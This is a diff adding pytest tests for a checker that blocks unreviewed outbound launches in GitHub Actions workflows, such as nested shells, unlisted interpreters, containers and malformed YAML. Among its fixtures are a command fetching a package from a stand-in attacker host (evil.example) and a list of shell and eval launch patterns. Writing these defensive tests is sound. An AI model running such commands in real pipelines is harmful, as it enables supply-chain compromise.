@@ -233,6 +233,132 @@ def test_contract_accepts_parseable_workflow_python(contract_tree):
     assert result.returncode == 0, result.stderr
 
 
+@pytest.mark.parametrize('level', ['step', 'job', 'workflow'])
+@pytest.mark.parametrize('shell', ['python', 'python {0}', 'bash {0}', 'ruby'])
+def test_contract_blocks_unsupported_effective_shell(contract_tree, level, shell):
+    step = {'run': 'import socket', 'name': 'Synthetic shell'}
+    job = {'steps': [step]}
+    workflow = {'jobs': {'probe': job}}
+    if level == 'step':
+        step['shell'] = shell
+    else:
+        (job if level == 'job' else workflow)['defaults'] = {'run': {'shell': shell}}
+    path = contract_tree / '.github/workflows/synthetic.yml'
+    # fixture-write: Seed synthetic effective-shell selection without execution.
+    path.write_text(yaml.safe_dump(workflow))
+    result = run_contract(contract_tree)
+    assert result.returncode == 1, result.stdout
+    assert 'unsupported shell' in result.stderr
+    assert 'synthetic.yml:' in result.stderr and 'job probe, step 1' in result.stderr
+
+
+@pytest.mark.parametrize('command', [
+    '$PYTHON', '${{ steps.py.outputs.python-path }}', 'python2', 'pypy3', 'py',
+    'python.exe', '/synthetic/pypy3', 'python3.12.exe', 'node', 'perl',
+    'bash -c', 'sh -c', 'pwsh -Command', 'eval', 'env MODE=synthetic $PYTHON',
+    'echo synthetic; $PYTHON', 'bash -lc', 'pypy3.exe', 'Python', 'jython',
+    'if $PYTHON', '/usr/bin/env $PYTHON', 'uv run $RUNTIME', 'timeout 5 $RUNTIME',
+])
+def test_contract_blocks_unparsed_interpreter_or_nested_shell(contract_tree, command):
+    nested = command in {'bash -c', 'sh -c', 'bash -lc', 'pwsh -Command', 'eval'}
+    source = f'{command} \'python -c "import socket"\'' if nested else f'{command} -c "import socket"'
+    if command.startswith('if '):
+        source += '; then :; fi'
+    unsupported_workflow_launch(contract_tree, {'run': source})
+
+
+@pytest.mark.parametrize('command', ['pyw.exe', r'& "C:\synthetic\python.exe"'])
+def test_contract_blocks_windows_python_launchers(contract_tree, command):
+    unsupported_workflow_launch(contract_tree, {'shell': 'pwsh', 'run': f'{command} -c "import socket"'})
+
+
+@pytest.mark.parametrize('command', [
+    'python /tmp/synthetic.py', 'python scripts/synthetic.py',
+    'python -m pip download https://evil.example/synthetic.whl', 'python -m http.server',
+])
+def test_contract_blocks_unlisted_script_or_module(contract_tree, command):
+    path = contract_tree / '.github/workflows/synthetic.yml'
+    # fixture-write: Seed an unreviewed file or module launch for static inspection.
+    path.write_text(yaml.safe_dump({'jobs': {'probe': {'steps': [{'run': command}]}}}))
+    result = run_contract(contract_tree)
+    assert result.returncode == 1, result.stdout
+    assert 'unreviewed outbound workflow-launch' in result.stderr
+    assert 'synthetic.yml:' in result.stderr
+
+
+@pytest.mark.parametrize('uses', ['docker://python:3.12', './.github/actions/synthetic'])
+def test_contract_blocks_unlisted_container_or_local_action(contract_tree, uses):
+    path = contract_tree / '.github/workflows/synthetic.yml'
+    step = {'uses': uses, 'with': {'args': 'python -c "import socket"'}}
+    # fixture-write: Seed an unreviewed action without creating or running a container.
+    path.write_text(yaml.safe_dump({'jobs': {'probe': {'steps': [step]}}}))
+    result = run_contract(contract_tree)
+    assert result.returncode == 1, result.stdout
+    assert 'unreviewed outbound workflow-action' in result.stderr
+    assert 'synthetic.yml:' in result.stderr
+
+
+@pytest.mark.parametrize('source', [
+    '', 'jobs: [', 'jobs: {}', 'jobs: {probe: scalar}',
+    'jobs: {probe: {steps: oops}}', 'jobs: {probe: {steps: [scalar]}}',
+    'jobs: {probe: {steps: [{run: [python, -c, synthetic]}]}}',
+    'jobs: {probe: {steps: [{run: echo, shell: []}]}}',
+    'defaults: []\njobs: {probe: {steps: [{run: echo}]}}',
+    'jobs: {probe: {steps: [{uses: []}]}}',
+])
+def test_contract_reports_malformed_workflow_without_traceback(contract_tree, source):
+    path = contract_tree / '.github/workflows/synthetic.yml'
+    # fixture-write: Seed malformed synthetic YAML or workflow field types.
+    path.write_text(source)
+    result = run_contract(contract_tree)
+    assert result.returncode == 1
+    assert 'synthetic.yml:' in result.stderr
+    assert 'invalid workflow' in result.stderr
+    assert 'Traceback' not in result.stderr
+
+
+def test_contract_every_current_workflow_passes(contract_tree):
+    assert {path.name for path in (ROOT / '.github/workflows').iterdir()} == {
+        path.name for path in (contract_tree / '.github/workflows').iterdir()}
+    result = run_contract(contract_tree)
+    assert result.returncode == 0, result.stderr
+
+
+@pytest.mark.parametrize('shell', ['bash', 'sh', 'pwsh'])
+def test_contract_effective_shell_override_precedence(contract_tree, shell):
+    step = {'shell': shell, 'run': 'echo synthetic'}
+    workflow = {'defaults': {'run': {'shell': 'python'}}, 'jobs': {
+        'probe': {'defaults': {'run': {'shell': shell}},
+                  'steps': [step, {'run': 'echo synthetic'}]}}}
+    # fixture-write: Seed supported step and job overrides of an unsupported workflow default.
+    (contract_tree / '.github/workflows/synthetic.yml').write_text(yaml.safe_dump(workflow))
+    assert run_contract(contract_tree).returncode == 0
+
+
+@pytest.mark.parametrize('uses', ['docker://python:3.12', './.github/actions/synthetic'])
+def test_contract_action_allowance_binds_inputs(contract_tree, uses):
+    path = contract_tree / '.github/workflows/synthetic.yml'
+    step = {'uses': uses, 'with': {'args': 'synthetic'}}
+    workflow = {'jobs': {'probe': {'steps': [step]}}}
+    # fixture-write: Seed a synthetic action and require review before accepting it.
+    path.write_text(yaml.safe_dump(workflow))
+    assert run_contract(contract_tree).returncode == 1
+    spec = importlib.util.spec_from_file_location('network_contract', ROOT / 'scripts/network-contract.py')
+    checker = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(checker)
+    row = next(row for row in checker.source_inventory(contract_tree) if row[2] == 'workflow-action')
+    policy = contract_tree / 'config/egress-allowlist.toml'
+    # fixture-write: Grant only the exact synthetic action-step inventory entry.
+    policy.write_text(policy.read_text() + '\n[[source]]\n' + '\n'.join(
+        f'{key} = {json.dumps(value)}' for key, value in zip(
+            ('path', 'kind', 'digest', 'detail'), (row[0], *row[2:]))))
+    assert run_contract(contract_tree).returncode == 0
+    step['with']['args'] = 'changed synthetic input'
+    # fixture-write: Change action inputs to invalidate the reviewed digest.
+    path.write_text(yaml.safe_dump(workflow))
+    assert 'unreviewed outbound workflow-action' in run_contract(contract_tree).stderr
+
+
 @pytest.mark.parametrize("value", [
     "os.path.join", "json.dumps", "recordbench.env",
     "synthetic-figure.png", "synthetic-report.json", "pathlib.path", "builtins.str",
